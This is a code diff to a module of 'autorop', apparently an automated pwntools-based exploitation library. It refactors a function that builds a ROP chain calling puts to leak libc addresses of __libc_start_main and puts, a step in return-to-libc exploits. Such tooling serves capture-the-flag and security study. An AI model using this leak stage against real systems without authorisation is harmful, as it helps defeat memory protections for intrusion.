@@ -1,34 +1,38 @@
-from autorop import PwnState, arutil
+from autorop import PwnState, arutil, constants
 from pwn import ROP
+from typing import Iterable
 
 
-def puts(state: PwnState) -> PwnState:
+def puts(
+    short: bool = False, leak_symbols: Iterable[str] = ["__libc_start_main", "puts"]
+) -> constants.TYPE_PIPE:
     """Leak libc addresses using ``puts``.
 
-    This function leaks the libc addresses of ``__libc_start_main`` and ``puts``
-    using ``puts``, placing them in ``state.leaks``.
+    This returns a function which leaks the addresses of (by default)
+    ``__libc_start_main`` and ``puts`` using ``puts``,
+    placing them in ``state.leaks``.
 
     Arguments:
-        state: The current ``PwnState`` with the following set
-
-            - ``target``: What we want to exploit.
-            - ``_elf``: pwntools ``ELF`` of ``state.binary_name``.
-            - ``overwriter``: Function which writes rop chain to the "right place".
-            - ``vuln_function``: Name of vulnerable function in binary,
-              which we can return to repeatedly.
+        short: Whether the attack should be minimised i.e. leak only one address.
+        leak_symbols: What symbols should be leaked.
 
     Returns:
-        Mutated ``PwnState``, with the following updated
+        Function which takes the state, and returns the mutated ``PwnState``,
+        with the following updated
 
             - ``target``: The instance of target from which we got a successful leak.
               Hopefully it can still be interacted with.
             - ``leaks``: Updated with ``"symbol": address`` pairs for each
-              function address of libc that was leaked.
+              address that was leaked.
     """
-    LEAK_FUNCS = ["__libc_start_main", "puts"]
+    if short:
+        leak_symbols = [next(iter(leak_symbols))]
 
-    def leaker(rop: ROP, address: int) -> ROP:
-        arutil.align_call(rop, "puts", [address])
-        return rop
+    def puts_instance(state: PwnState) -> PwnState:
+        def leaker(rop: ROP, address: int) -> ROP:
+            arutil.align_call(rop, "puts", [address])
+            return rop
 
-    return arutil.leak_helper(state, leaker, LEAK_FUNCS)
+        return arutil.leak_helper(state, leaker, leak_symbols)
+
+    return puts_instance
